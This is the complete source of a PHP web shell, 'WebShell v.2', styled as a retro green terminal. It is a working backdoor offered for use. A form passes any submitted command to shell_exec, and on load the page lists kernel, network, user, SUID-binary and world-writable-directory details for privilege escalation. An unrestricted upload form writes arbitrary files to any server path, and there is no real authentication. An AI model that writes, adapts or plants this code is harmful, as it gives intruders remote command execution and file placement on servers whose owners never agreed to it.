<!-- MuteAvery was here <:~ -->

<style>
@keyframes retroScroll {
    0% { background-position: 0 0; }
    100% { background-position: 0 4px; }
}

@keyframes retroGlow {
    0%,100% { box-shadow: 0 0 6px #22ff55 inset; }
    50%      { box-shadow: 0 0 12px #22ff55 inset; }
}

.retro-terminal {
    margin-top: 15px;
    border: 2px solid #22ff55;
    background: #000;
    border-radius: 6px;
    overflow: hidden;
    background-image:
        linear-gradient(rgba(0,255,70,0.05) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0,255,70,0.02) 1px, transparent 1px);
    background-size: 100% 3px, 3px 100%;
    animation:
        retroScroll 0.4s linear infinite,
        retroGlow 3s ease-in-out infinite;
}

.retro-terminal-header {
    background: #22ff55;
    color: #000;
    padding: 6px 10px;
    font-family: Consolas, monospace;
    font-weight: bold;
    border-bottom: 2px solid #22ff55;
}

.retro-terminal-body {
    padding: 10px;
    color: #22ff55;
    font-family: Consolas, monospace;
    text-shadow: 0 0 5px #22ff55;
    white-space: pre-wrap;
}

/*Body*/
body {
    margin: 0;
    padding: 20px;
    min-height: 100vh;
    font-family: 'Courier New', Courier, monospace;
    font-size: 16px;
    line-height: 1.5;
    color: #aaffaa; /* soft retro green text */
    background: #000; /* classic black terminal background */
    display: flex;
    justify-content: center;
    align-items: flex-start;
}

body::before {
    content: '';
    position: fixed;
    top: 0; left: 0;
    width: 100%;
    height: 100%;
    background: repeating-linear-gradient(
        to bottom,
        rgba(0,255,0,0.05),
        rgba(0,255,0,0.05) 1px,
        transparent 1px,
        transparent 3px
    );
    pointer-events: none;
    z-index: 0;
}

.pbp-container {
    position: relative;
    z-index: 1;
    background: rgba(0, 0, 0, 0.9);
    border: 2px solid #55ff55;
    border-radius: 8px;
    padding: 25px 35px;
    max-width: 800px;
    width: 90%;
    box-shadow: 0 0 20px rgba(85, 255, 85, 0.4);
}

@keyframes retroFlicker {
    0%, 100% { text-shadow: 0 0 4px #aaffaa; }
    50% { text-shadow: 0 0 12px #aaffaa; }
}

.pbp-container, h1, h2, h3, p, a {
    animation: retroFlicker 3s ease-in-out infinite;
}

h1, h2, h3 {
    color: #aaffaa;
    text-shadow: 0 0 6px #aaffaa;
    margin: 0 0 12px 0;
}


p {
    margin-bottom: 12px;
}

a {
    color: #aaffaa;
    text-decoration: underline;
}

a:hover {
    color: #ccffcc;
    text-shadow: 0 0 6px #ccffcc;
}

button {
    background: #000;
    color: #aaffaa;
    border: 2px solid #aaffaa;
    border-radius: 6px;
    padding: 10px 18px;
    cursor: pointer;
    box-shadow: 0 0 8px rgba(170,255,170,0.5);
    font-family: 'Courier New', monospace;
    transition: all 0.2s ease;
}

button:hover {
    box-shadow: 0 0 16px rgba(170,255,170,0.8);
    transform: translateY(-1px);
}

code, pre {
    background: rgba(0,255,0,0.05);
    padding: 4px 8px;
    border-radius: 4px;
    font-family: 'Courier New', monospace;
    color: #aaffaa;
    text-shadow: 0 0 4px #aaffaa;
}
</style>


<?php
echo '<body style="background-color:#424242;">';
?>


<!-- Authenticated -->
<font style="float:left;" color="#F1F1F1"><b>WebShell v.2 <:~ </b></font><br /><br />
<fieldset style="border:2px solid #25F511;opacity:0.5;border-radius:5px;background:#000000;">
<form style="float:left;color:#25F511;" action='<?php echo $_SERVER["PHP_SELF"]?>' method=
"post">
<b>Run Command:</b><br />
<input type= "text" name="command" />
<input type="submit" value="Run"/><p>


<?php if (!empty($_POST['command'])) : ?>
    <div class="retro-terminal">
        <div class="retro-terminal-header">Backdoor</div>
        <div class="retro-terminal-body">
            <?php echo shell_exec($_POST['command']); ?>
        </div>
    </div>
<?php endif; ?>


<br><br>
<b>System Info:</b><p>
------------------------------------------------------------------------------------------------------------

<br><br>
<b>Kernel & OS Info</b>
<?php
$uname = shell_exec("uname -a;" .
  "awk -F= '/^(PRETTY_NAME|BUILD_ID)=/ { gsub(/\"/, \"\", \$2); print \$1\": \"\$2 }' /etc/os-release");
echo "<pre>$uname</pre>";
?>


<b>Network interfaces</b>
<?php
$ip_addr = shell_exec("ip addr | grep inet | grep -v inet6 | awk '{print $2}' | grep -v 127");
echo "<pre>$ip_addr</pre>";
?>

<b>disks</b>
<?php
$disk = shell_exec("df -h");
echo "<pre>$disk</pre>";
?>

<b>User info</b>
<?php
$user = shell_exec("whoami; id");
echo "<pre>$user</pre>";
?>

<b> Connected Users </b>
<?php
$users = shell_exec("who -u");
echo "<pre>$users</pre>";
?>

<b>SUIDS</b>
<?php
$SUIDS = shell_exec("find / -xdev -maxdepth 4 -perm -4000 -type f 2>/dev/null");
echo "<pre>$SUIDS</pre>";
?>


  </form>

<form style="float:right;margin-left:15px;color:#ffffff;"action="" method="POST" enctype="multipart/form-data">
<b>Remote Upload Path:</b><br />
<input type="text" name="upload" /> (Use full paths)<br /><br />
<b>File Upload:</b><br />
<input type="submit" value="Upload!"/>
<input type="file" name="file" /><P>
<b>Current Remote Directory:</b><br />
----------------------------------------------------------


<style>
.output-block {
    background-color:#222;
    color: #fff;
    padding: 15px;
    margin: 20px 0 20px 30px.;
    border-radius: 8px;
    font-family: monospace;
}
</style>

<div class="output-block">

<?php
$pwd = shell_exec("pwd");
echo "<pre>$pwd</pre>";
?>

<b> R/W dirs for you </b>
<?php
  $R_W_dirs = shell_exec(
      "find / -xdev \\( -path /proc -o -path /sys -o -path /dev -o -path /run \\) " .
      "-prune -o -type d -perm -0002 -print 2>/dev/null"
  );
  echo "<pre>$R_W_dirs</pre>";
    ?>
</div>
</form></fieldset>



<div class="output-block">
<?php
if (isset($_FILES['file'])) {
      $errors = array();
      $file_name = $_FILES['file']['name'];
      $file_size = $_FILES['file']['size'];
      $file_tmp = $_FILES['file']['tmp_name'];
      $file_type = $_FILES['file']['type'];
      $file_ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

    if (empty($errors) == true) {
         move_uploaded_file($file_tmp, $_POST['upload'] . $file_name);
         echo '<pre><span style="font-size: 11px; color: #FFFFFF;">';
         echo 'Upload: ' . $_FILES['file']['name'] . '<br />';
         echo 'Size: ' . ($_FILES['file']['size'] / 1024) . ' Kb<br />';
         echo 'Stored in: ' . $_POST['upload'];
         echo '</span></pre>';
    } else {
         print_r($errors);
    }
}
?>
</div>
